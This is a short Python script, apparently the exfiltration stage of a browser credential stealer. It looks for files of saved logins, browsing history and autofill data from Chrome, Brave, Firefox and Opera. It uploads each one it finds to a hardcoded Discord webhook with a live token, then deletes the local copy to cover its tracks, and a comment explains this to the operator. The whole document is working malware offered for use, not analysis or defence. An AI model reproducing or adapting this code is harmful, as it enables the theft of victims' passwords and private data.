import os
from dhooks import Webhook, File
import time

hook = Webhook("https://discord.com/api/webhooks/1509179022737670184/X0ivY7dJ4_VFKflU6I8BWKH6cHtvysNlV1JFI9Br0CUIw8pQ_wK1t6mCHfrs5VoqrYwu")

time.sleep(0.5)


files_to_check = [
    'chrome_login.txt',
    'chrome_history.txt',
    'chrome_autofill_data.txt',
    'brave_login.txt',
    'brave_history.txt',
    'brave_autofill_data.txt',
    'firefox_login.txt',
    'firefox_history.txt',
    'opera_login.txt',
    'opera_history.txt',
    'opera_autofill_data.txt'
]

for file in files_to_check:
    if os.path.exists(file):

        file_variable = File(file)
        hook.send(f"FILE FOUND: {file}", file=file_variable)

        os.remove(file)

        continue
    else:
        pass


# THIS IS THE SCRIPT THAT WILL CHECK FIRSTLY IF THE FILE IN " files_to_check " exist and then gonna send it to your discord webhook and they gonna be deleted automaticly using "os.remove(file)"
